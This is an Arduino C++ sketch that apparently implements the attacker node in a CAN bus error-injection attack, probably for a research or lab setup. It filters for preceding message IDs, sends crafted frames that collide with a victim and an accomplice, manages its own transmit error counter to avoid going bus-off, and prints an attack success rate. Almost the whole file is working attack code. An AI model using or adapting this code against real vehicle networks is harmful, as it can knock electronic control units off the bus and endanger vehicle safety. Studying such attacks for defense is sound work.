#include <SPI.h>
#include "mcp_can.h"

const int SPI_CS_PIN = 9;
MCP_CAN CAN(SPI_CS_PIN); 

#include "duet-config.h"

int tecList[10] = {0,0,0,0,0,0,0,0,0,0};
long tecIDList[10] = {0,0,0,0,0,0,0,0,0,0};
int dataLastBytes[10] = {0,0,0,0,0,0,0,0,0,0};
int bufList[10] = {0,0,0,0,0,0,0,0,0,0};
int enabledList[10] = {0,0,0,0,0,0,0,0,0,0};
int tecCounter=0;
int attackSuccess=0;
int attackFailure=0;

uint64_t lastBitUpdate=0;

int bitToManipulateVictim = 16; //0 to 63. //Change this
int bitToManipulateAccomplice = 16; //0 to 63. //Change this
int bitToManipulate = 16; //Change this
int byteToManipulate = 0;
byte byteValueToManipulate = 0xFF;

int corruptionCounter=0;
int corruptionCounterMax=9;
int corruptionCounterBelow=10;//Change this

bool oneShotEnabled = true;
bool goingPassive = false;
uint64_t goingPassiveTime = 0;

void setup() {
  commonSetup();
  attackerMaskAndFilter();
  startCleanTimer();
  setBitToManipulate();
}

void loop() {
  uint64_t timeNow = getElapsedTime();
  if (attackerTEC>220){
    int bufToCheck[] = {0,2};
    bool isNoTXPending = noTXPending(bufToCheck,2);
    if (isNoTXPending){
      int filterIDs[4] = {precedeID1, precedeID3, phaseChangeToTestID, phaseChangeToTrainID};
      resetCANController(filterIDs,4);
      oneShotEnabled = true;
      goingPassive = false;
      attackerTEC = readTEC();
      emptyBuffers(); 
    }
  }
  if (goingPassive && !oneShotEnabled){
    attackerTEC = readTEC();
    uint64_t timeNow = getElapsedTime();
    if (attackerTEC>=128 || timeNow>goingPassiveTime+3000){
      oneShotEnabled = true;
      enableOneShot();
      goingPassive = false;
    }
  }
  if (oneShotEnabled && attackerTEC<128){
    oneShotEnabled=false;
    disableOneShot();
  }
  while (!goingPassive && CAN_MSGAVAIL == CAN.checkReceive()){
    long canID = readMsgID();
    //garbageMsg(127) means accomplice does not intend accomplice. victimMsg(1) means accomplice, accompliceMsg(2) means initialize
    if (((canID == precedeID1) || (canID == precedeID3))){
      
      if (trainingPhase && canID==precedeID3){
        corruptionCounter = (corruptionCounter==corruptionCounterMax)?0:(corruptionCounter+1);
        if (corruptionCounter>=corruptionCounterBelow){
          int lastTEC = attackerTEC; attackerTEC = readTEC();
          if (attackerTEC>lastTEC && lastTEC>127)  attackSuccess++; else attackFailure++;
          continue;
        }
      }
      
      if (buf[7]==1){
        unsigned char * msgToSend = chooseDataToSendScission(canID);
        bool manipulated = true;
        int lenToSend=8; if (!oneShotEnabled) lenToSend=15;
        if (canID == precedeID1 && !oneShotEnabled) {
          sendInParticularBuf(accompliceID, msgToSend, 0, lenToSend);
          goingPassive = true;
          goingPassiveTime = getElapsedTime();
        } else if (canID == precedeID3 && oneShotEnabled) {
          sendInParticularBuf(victimID, msgToSend, 0, lenToSend);
        } else manipulated = false;
        
        if (buf[7]==1 && manipulated) {
          saveAndPrint(canID);
        }
        
      } else if (buf[7]==accompliceBenignMsg[7]) {
        if (canID == precedeID1 && !oneShotEnabled){
          saveAndPrint(canID);
        } else if (canID == precedeID3 && oneShotEnabled){
          saveAndPrint(canID);
        }
      }
    }
    else if (canID == phaseChangeToTestID){
      trainingPhase = false;
    }
    else if (canID == phaseChangeToTrainID){
      trainingPhase = true;
    }
  }

  for (int i=0; i<attacker_numIDs; i++){
    if (attacker_sendIDs[i]){
      if (shouldWakeup(attacker_nextWakeupAtOverflows[i],
                attacker_nextWakeupAtCounter[i]) && !goingPassive){
        int res = sendInParticularBuf(attacker_IDs[i], attackerMsg, 2);
        if (res==CAN_FAILTX) continue;
        setWakeupTimer((uint64_t)(attacker_periods[i]*1000), &(attacker_nextWakeupAtOverflows[i]), &(attacker_nextWakeupAtCounter[i]), false);
        emptyBuffers(); 
      }
    }
  }

}


void attackerMaskAndFilter(){
  for (int i=0;i<2;i++)  CAN.init_Mask(i, 0, 0x3ff);
  CAN.init_Filt(0, 0, precedeID1);
  CAN.init_Filt(1, 0, precedeID3);
  CAN.init_Filt(2, 0, precedeID1);
  CAN.init_Filt(3, 0, precedeID3);
  CAN.init_Filt(4, 0, phaseChangeToTrainID);
  CAN.init_Filt(5, 0, phaseChangeToTestID);
}

void setBitToManipulate(){
  bitToManipulate = bitToManipulateVictim;
  byteToManipulate = (bitToManipulate/8);
  byteValueToManipulate = (byte) ((1 << (7 - (bitToManipulate % 8) + 1)) - 1);
  for (int i=0; i<=byteToManipulate; i++)  victimMsg[i] = 0;
  victimMsg[byteToManipulate] |= byteValueToManipulate;
  for (int i=byteToManipulate+1; i<8; i++) victimMsg[i] = 0xFF;
}

inline unsigned char * chooseDataToSendScission(long canID){
  return victimMsg;
}

void saveAndPrint(long canID){
  int lastTEC = attackerTEC; attackerTEC = readTEC();
  if (attackerTEC==0 && lastTEC!=0) {
    attackSuccess++;
    if (canID==precedeID3) attackFailure++; //WIll be failure
  }
  else {
    if (canID==precedeID3 && lastTEC>127){
      if (attackerTEC>lastTEC)  attackSuccess++; else attackFailure++;
    }
  }
  tecList[tecCounter] = attackerTEC; tecIDList[tecCounter] = canID;
  bufList[tecCounter]=buf[7];dataLastBytes[tecCounter] = victimMsg[7];enabledList[tecCounter]=oneShotEnabled;
  tecCounter++;
  if (tecCounter==10){
    for (int i=0;i<10;i++){
      Serial.print(tecList[i]);
//      Serial.print(":");
//      Serial.print(tecIDList[i]);
//      Serial.print(":");
//      Serial.print(enabledList[i]);
      Serial.print(",");
    }
    Serial.print(" == ");
    float attackRate = ((float)attackSuccess)/(attackSuccess+attackFailure);
    Serial.print(attackRate);
    Serial.print(",");
    Serial.println(trainingPhase);
    tecCounter=0;
  }
}
